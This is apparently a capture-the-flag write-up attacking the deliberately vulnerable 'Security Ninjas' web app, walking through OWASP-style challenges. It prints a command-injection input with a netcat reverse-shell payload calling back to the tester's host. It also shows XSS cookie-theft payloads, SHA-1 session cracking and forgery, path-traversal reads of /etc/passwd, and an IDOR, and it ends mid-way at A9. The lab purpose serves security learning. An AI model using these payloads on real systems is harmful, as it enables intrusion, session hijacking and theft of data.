This is a Vulnerable Machine ```Security Ninjas```.

We can test this for common web vulnerabilities

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/daaddc57-1780-4268-b995-afff747dbbaf)

Well, lets dig in


# A1
<hr>

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/17788d91-cbd8-4094-a1c4-63fe307635dc)

We were told that this page has an ```OS Command Injection``` flaw

Lets provide a domain name say ```google.com```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/84db4b64-e987-4ed0-9fcb-eee65f7835f9)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/89c48ad7-31a2-4491-9d29-a7c7f0085987)

So we got the whois look up results for the domain name ```google.com```

The ```semicolon(;)``` is often used as a delimiter so seperate multiple commands within a single input field. So, we can try to use the ```semicolon(;)``` character to run multiple commands.

For example lets say we want to run the ```id``` command alongside the domain name we provided. So, we'll be having an input like this ```google.com;id```

Lets try to execute this to see what happens

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/730ee60f-38a8-4c9a-85a4-5cf2f525d477)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7a23174f-f258-4b4d-8bad-91b5efffcb21)

Scroll down,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6cef73f1-ffc0-4d30-858d-a7a1e4217465)

It worked hehe, we were able to successfully execute the linux command

Other delimiter characters like ```|``` and ```||``` also works

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a25768ec-3be8-489a-9333-e3c310810ef2)

Lets get a reverse shell from this

payload:```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f```

Ensure you set up a netcat listener

So, our input would look like this ```google.com|rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.168 1234 >/tmp/f```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c6f015db-919f-44b6-82ef-1c31a1c74737)

Checking my netcat listener

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/26861a22-4676-4f97-af6f-8a515b1e3055)

I was able to get a reverse shell.

Well, that's all for this challenge since we've successfully exploited the vulnerability there. 

--------------------------

# A2
<hr>

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/11a9f185-7ec9-4718-9d2f-201b125f8df8)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0a6fc465-dff6-4ecf-8bde-eb388da15227)

So the exercise here is to get ```user2``` personal information by exploiting the ```Broken Authentication and Session Management``` vulnerability

Lets try to login with the details they provided to us

username:```user1```        password:```145_Bluxome```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/fa96800c-803b-4392-aa4e-c3089c40e40d)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c8aca000-2109-4af5-b21d-b80d262b5051)

Cool, we are logged in

Lets try to view personal details, but this time we'll capture the request to burpsuite and send it over to burp repeater

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2dce07c1-a515-4bef-9e4e-f8567e4b1394)

We were able to view the personal information of ```user1```. Well, something eyes catching here is the ```sessionID```.

I ran ```hash-identifier``` on that hash and found

```
┌──(bl4ck4non㉿bl4ck4non)-[~]
└─$ hash-identifier     
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: b3daa77b4c04a9551b8781d03191fe098f325e67

Possible Hashs:
[+] SHA-1
[+] MySQL5 - SHA-1(SHA-1($pass))
```
Cool, the hash is ```SHA-1```. Lets crack it to see what it says

Save the hash in a file and use john

command:```john hash  --wordlist=/home/bl4ck4non/Documents/rockyou.txt --format=RAW-sha1```

```
┌──(bl4ck4non㉿bl4ck4non)-[~]
└─$ john hash  --wordlist=/home/bl4ck4non/Documents/rockyou.txt --format=RAW-sha1
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
user1            (?)     
1g 0:00:00:02 DONE (2023-09-29 16:37) 0.4878g/s 1446Kp/s 1446Kc/s 1446KC/s user1 01989..user074
Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
Session completed. 
```
John cracked the hash to be ```user1```. 

So, we can say the ```sessionID``` is ```user1```.

To read ```user2``` personal information, what we can do is generate a ```sha1``` hash for ```user2```.

I used this [website](https://codebeautify.org/sha1-hash-generator) for that

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ff21b9eb-2391-4942-8983-6e12d16d59d7)

Now. we'll be replacing the previous ```sessionID``` value with ```a1881c06eec96db9901c7bbfe41c42a3f08e9cb4```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f23c1c76-e085-444c-8214-959c89fc97fd)

cool cool, we are able to read the personal information for ```user2```.

That will be all for this challenge since we have successfully exploited the vulnerability😎

-----------------------------

# A3
<hr>

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9dad152f-ec4c-466d-af5a-1d6965baebc6)

We have both ```Reflected XSS``` and ```Stored XSS``` here.

Lets start with ```Reflected XSS```

### Reflexted XSS

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/af6179f2-80f0-4737-8412-c84b0c9c761d)

Well, my name is ```BlackAnon```, lets try that

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/063cf694-f826-436f-be3f-c61e8c1971f5)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5a93b51d-abbd-437e-b070-57b2738d469e)

Lets try a simple javascript payload ```<script>alert(1)</script>```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/fff508ea-5f99-4e09-8e92-afbfb4b72d61)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/10c4aa1d-183f-4438-8ffe-f0c64582341b)

The payload got executed successfully. Lets try to steal some cookies ```<script>alert(document.cookie)</script>```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/1c051c2e-b22b-4591-b3f0-cc8365600ffe)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/81c25afb-1ac8-4f63-9b14-9d2235197ff6)

Nice nice, we have successfully exploited this vulnerability.

Moving on to ```Stored XSS```

### Stored XSS

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5bcfb808-d9a5-4aef-aff4-35aaea4d1e0f)

Lets try to provide some inputs

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/198b6bf0-32c1-4e98-bab5-51c0223ed813)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/fbc469e3-1f91-4626-9b86-6845f0bf2b56)

Now, stored xss occurs when an application allows users to store data that includes malicious scripts on the server, and then serves that data to other users who view the affected page. This allows the attacker to execute their malicious code in the context of other users' browsers, potentially leading to various security risks.

This means our payload will be stored and executed when a user performs an action in the affected page.

Lets inject the ```Name``` parameter with a simple javascript payload ```<script>alert(1)</script>```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/fe3672ff-021a-439a-b460-b82d39ff49ad)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7bfdbb6d-8176-41f0-9b57-e30faa485172)

Account creation was successful. Our payload will get executed when a user tries to view all the users in the database by clicking ```View Users```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/71966178-80d9-47b9-bdeb-ba6d00865d00)

You can see it worked.

Lets try to steal cookies this time with the payload ```<script>alert(document.cookie)</script>```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/bf39b325-0a2b-4573-bdb1-7cecb6dcc206)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ed0c12ae-655e-48eb-ac11-14b9a7480499)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/169e10e5-528d-4b30-b4a8-635e487d9463)

Our payload got executed successfully.

We have successfully exploited both ```Reflected XSS``` and ```Stored XSS```

------------------------------

# A4
<hr>

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3600f3bb-dcfd-4c1e-912d-63d27356b653)

So the task is to exploit the ```IDOR``` vulnerability and find a confidential document on the server.

Lets try to view the non-confidential document

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7e0b0ad7-be22-4c38-b787-14f15915fdc0)

We get this. Well, the name of the pdf looks suspicious🤔

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e2f17502-9ac8-40c2-9792-9b1aa511dba8)

This looks like ```hex```, well lets use [cyberchef](https://gchq.github.io/CyberChef/) to decode

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a737a865-28f0-41d1-a2f7-16f64aea2e7d)

The hex was decoded to be the word ```non_confidential```. So, the way the document is named was by encoding the ```non_confidential``` word to ```hex```

This means to view the confidential document we have to encode the word ```confidential``` to ```hex```

Using [cyberchef](https://gchq.github.io/CyberChef/) to encode

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f1a56b21-1445-42e8-bc3f-3d1f6953567b)

Lets replace ```6e6f6e5f636f6e666964656e7469616c.pdf``` with ```636f6e666964656e7469616c.pdf```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c78e3ef1-36a2-4b53-9e45-73e1f0d4ff48)

We were able to successfully view the confidential document. This means we have successfully completed this exercise😎

----------------------

# A5
<hr>

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/1c7f7add-69e1-4a01-a8aa-ee6e1b9a5cf7)

The task here is to exploit the ```file inclusion``` vulnerability

What happens when we click on ```Meme1```??

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/59e2a6d2-a0c1-43d7-af43-8cb890c5fd8c)

Take note of the url

How about when we click on ```Meme2```??

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4ebb6993-a727-458a-b585-44213fb83633)

Take a note of the url for this also.

Lets, capture this request on burpsuite and send it over to burp repeater

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9479960a-babe-43a6-9894-900e7865963b)

Now, lets test for file inclusion vulnerabilities

We'll start with ```Local File Inclusion```

### Local File Inclusion

Local File Inclusion (LFI) is a type of security vulnerability that occurs when an attacker can manipulate input to a web application or system in such a way that it allows them to include and execute files on the local file system.

To test for this, we can use the payload ```../../../../../../etc/passwd```, so we'll replace ```meme2.html``` in the url to this payload

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/81036cb6-c265-4b05-9fc2-6e83d869b672)

Cool stuff hehe, we were able to exploit Local File Inclusion on this server.

Moving on to ```Remote File Inclusion```

### Remote File Inclusion

Remote File Inclusion (RFI) is a security vulnerability that occurs in web applications when an attacker is able to include files from a remote server into the web application's code.

So, we'll host a file on our machine and try to execute it from the web application.

Lets host a ```.txt``` file

```
┌──(bl4ck4non㉿bl4ck4non)-[~]
└─$ echo "vawulence is good for the health" > bankai.txt
                                                                                                                                                                                                
┌──(bl4ck4non㉿bl4ck4non)-[~]
└─$ ls -l bankai.txt 
-rw-r--r-- 1 bl4ck4non bl4ck4non 33 Sep 29 23:19 bankai.txt
                                                                                                                                                                                                
┌──(bl4ck4non㉿bl4ck4non)-[~]
└─$ python3 -m http.server 80                                      
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
nice nice, now lets try to execute this file from the webserver

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0425e526-e559-44f2-ab04-d2b9d88368f8)

Well, it didn't work, our file didn't get executed.

So, it is safe to say we can exploit the Local File Inclusion on this webserver but not Remote File Inclusion.

We've successfully completed this task

------------------------

# A6
<hr>

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8eeff47b-f11a-4bc7-b6a4-d2c359c8fbf2)

The task here is to find the hidden discount code by exploiting the ```sensitive data exposure``` vulnerability

Checking the page source, I found this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/58583c67-3d0b-471a-a46c-dd6c5fcb7136)

That's a conditional statement that gives 10% off if the discount code matches ```oneteamonedream```.

We've completed the task😎. It was quite easy actually

------------------------

# A7
<hr>

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f69e481a-2b5d-40c8-ab7c-748b54c4b4dc)

The task here is to find the function that lacks access control

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/59fe9b8c-efb2-4d6b-9d2f-30f6d2cb815f)

Click on that, then capture the request using burpsuite and send it over to burp repeater

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8c799bb9-b5af-4d9f-80ff-524af73a6db1)

We can see the ```is_admin``` function has a value of ```false```. What happens when we change that value to ```true```??

Well, lets find out

-----------------

# A8
<hr>

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/cb7fd64a-62c9-49a4-89ec-03020ec137ae)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/fdf72be9-3a77-45d4-b96d-e9829e69262c)

We were provided login creds, the task is to login to the vulnerable page

Lets login as ```user1```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/918bf4de-efb8-4713-9571-fd27f1f190e9)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/1272b423-a0f6-4b48-88d8-cdce32a5a8d6)

We are asked to view email, lets do just that

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/62b2746e-1bde-41f3-9b28-77683d346a17)

We are told that this page doesn't have csrf protection, this means that it is vulnerable to CSRF attacks. CSRF is a type of security vulnerability where an attacker tricks a victim into making an unwanted or unauthorized request to a web application on which the victim is authenticated.

Lets try to update ```user1``` email address

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/456312f6-99ed-453d-a62e-462dd727093b)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8de70e00-2f77-4a7e-891a-a81399d1a7b7)

We were able to successfully update ```user1``` email address. Lets try updating the email for ```user2```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f0e37442-ea72-4629-8cbe-c5c2a64d55a2)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/aa0f3f94-f6f9-4207-ab89-0a0c2f9f3246)

So, we don't have the right privileges to perform this action

-----------------------------

# A9
<hr>

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/44b29293-e43a-4c63-ab51-68c3de389b55)

The task here is to exploit the public known vulnerability in one of the components the page uses

Checking the page source,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/40b1ab4c-884c-4032-bc45-2ea281f9e49f)

Well, I think there's a vulnerability for that component








